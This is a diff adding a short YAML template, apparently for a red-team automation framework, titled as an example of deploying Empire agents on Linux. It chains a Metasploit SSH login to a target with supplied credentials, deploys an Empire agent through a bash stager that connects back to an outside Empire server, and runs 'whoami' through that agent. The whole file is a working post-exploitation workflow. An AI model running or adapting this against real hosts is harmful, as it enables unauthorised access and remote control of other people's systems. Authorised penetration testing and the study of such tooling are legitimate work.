@@ -1,0 +1,45 @@
+---
+name: Empire agents on Linux example
+metadata:
+  description: This example shows how to deploy an Empire agent and execute a command command with the deployed agent.
+stages:
+  stage-one:
+    steps:
+      create-ssh-session:
+        is_init: true
+        module: metasploit
+        arguments:
+          module_name: scanner/ssh/ssh_login
+          datastore:
+            RHOSTS: {{ target.address }}
+            USERNAME: {{ target.username }}
+            PASSWORD: {{ target.password }}
+        next:
+          - type: result
+            value: ok
+            step: deploy-agent
+
+      deploy-agent:
+        module: empire
+        arguments:
+          action: deploy
+          agent_name: MyAgent
+          session_id: $create-ssh-session.session_id
+          listener:
+            name: testing
+            port: 80
+            options:
+              Host: {{ empire_server_address }}
+          stager:
+            type: multi/bash
+        next:
+          - type: result
+            value: ok
+            step: whoami-on-agent
+
+      whoami-on-agent:
+        module: empire
+        arguments:
+          action: execute-command
+          agent_name: MyAgent
+          command: whoami
